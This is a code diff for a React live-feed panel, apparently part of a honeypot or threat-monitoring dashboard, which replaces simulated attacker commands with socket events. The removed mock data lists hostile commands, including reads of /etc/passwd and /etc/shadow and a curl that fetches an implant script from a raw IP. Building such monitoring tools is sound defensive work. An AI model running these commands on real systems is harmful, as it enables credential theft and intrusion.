@@ -1,6 +1,7 @@
 import { useEffect, useRef, useState } from 'react';
 import { motion, AnimatePresence } from 'framer-motion';
 import { Terminal, Activity } from 'lucide-react';
+import { socket } from '../socket';
 
 export interface LogEntry {
     id: string;
@@ -17,40 +18,48 @@ const RISK_CONFIG: Record<LogEntry['risk'], { color: string; bg: string; border:
     CRITICAL: { color: '#EF4444', bg: 'rgba(239,68,68,0.15)', border: 'rgba(239,68,68,0.4)' },
 };
 
-const SEED_COMMANDS: Omit<LogEntry, 'id' | 'timestamp'>[] = [
-    { command: 'whoami', risk: 'LOW', score: 8 },
-    { command: 'cat /etc/passwd', risk: 'MEDIUM', score: 38 },
-    { command: 'sudo -l', risk: 'HIGH', score: 67 },
-    { command: 'sudo cat /etc/shadow', risk: 'CRITICAL', score: 89 },
-    { command: 'curl http://185.220.101.47:8080/implant.sh', risk: 'CRITICAL', score: 94 },
-];
-
-function makeEntry(cmd: Omit<LogEntry, 'id' | 'timestamp'>): LogEntry {
-    return {
-        id: `${Date.now()}-${Math.random()}`,
-        timestamp: new Date().toISOString().replace('T', ' ').slice(0, 19),
-        ...cmd,
-    };
-}
-
 export default function LiveFeed() {
-    const [logs, setLogs] = useState<LogEntry[]>(() => SEED_COMMANDS.slice(0, 3).map(makeEntry));
+    const [logs, setLogs] = useState<LogEntry[]>([]);
     const scrollRef = useRef<HTMLDivElement>(null);
-    const seedIdx = useRef(3);
 
-    // Auto-generate logs to simulate an active attacker
     useEffect(() => {
-        const iv = setInterval(() => {
-            const next = SEED_COMMANDS[seedIdx.current % SEED_COMMANDS.length];
-            seedIdx.current++;
-            setLogs((prev) => [...prev, makeEntry(next)].slice(-30));
-        }, 3000);
-        return () => clearInterval(iv);
+        // Debug: Log to see if the socket is actually connected
+        console.log("Socket status on mount:", socket.connected ? "Connected" : "Disconnected");
+
+        const handleNewAttack = (data: any) => {
+            console.log("🚨 Data received from socket:", data); // THIS IS YOUR KEY DEBUG LINE
+
+            const newLog: LogEntry = {
+                // Ensure we have a truly unique ID
+                id: (data.sessionId || 'web') + '-' + Date.now() + '-' + Math.random().toString(36).substr(2, 9),
+                timestamp: new Date().toISOString().replace('T', ' ').slice(0, 19),
+                command: data.command || 'Unknown Command',
+                risk: (data.severity as 'LOW' | 'MEDIUM' | 'HIGH' | 'CRITICAL') || 'LOW',
+                score: data.threatScore || 0
+            };
+
+            setLogs((prev) => {
+                const updatedLogs = [...prev, newLog];
+                return updatedLogs.slice(-30);
+            });
+        };
+
+        // Ensure we aren't attaching multiple listeners
+        socket.off('live_feed_update');
+        socket.on('live_feed_update', handleNewAttack);
+
+        return () => {
+            socket.off('live_feed_update', handleNewAttack);
+        };
     }, []);
 
-    // Auto-scroll to bottom
     useEffect(() => {
-        if (scrollRef.current) scrollRef.current.scrollTop = scrollRef.current.scrollHeight;
+        if (scrollRef.current) {
+            scrollRef.current.scrollTo({
+                top: scrollRef.current.scrollHeight,
+                behavior: 'smooth'
+            });
+        }
     }, [logs]);
 
     return (
@@ -68,15 +77,21 @@ export default function LiveFeed() {
                 <span className="w-24 text-center">RISK</span>
             </div>
 
-            <div ref={scrollRef} className="flex-1 overflow-y-auto space-y-2 pr-2">
+            <div ref={scrollRef} className="flex-1 overflow-y-auto space-y-2 pr-2 scroll-smooth">
+                {logs.length === 0 && (
+                    <div className="text-center p-8 text-slate-500 font-mono text-sm animate-pulse">
+                        Awaiting adversarial contact...
+                    </div>
+                )}
                 <AnimatePresence initial={false}>
                     {logs.map((entry) => {
-                        const cfg = RISK_CONFIG[entry.risk];
+                        const cfg = RISK_CONFIG[entry.risk] || RISK_CONFIG.LOW;
                         return (
                             <motion.div
                                 key={entry.id}
                                 initial={{ opacity: 0, x: -20 }}
                                 animate={{ opacity: 1, x: 0 }}
+                                exit={{ opacity: 0, transition: { duration: 0.2 } }}
                                 className="flex items-center gap-3 px-4 py-4 rounded-xl font-mono text-sm"
                                 style={{ background: cfg.bg, border: `1px solid ${cfg.border}`, borderLeft: `4px solid ${cfg.color}` }}
                             >
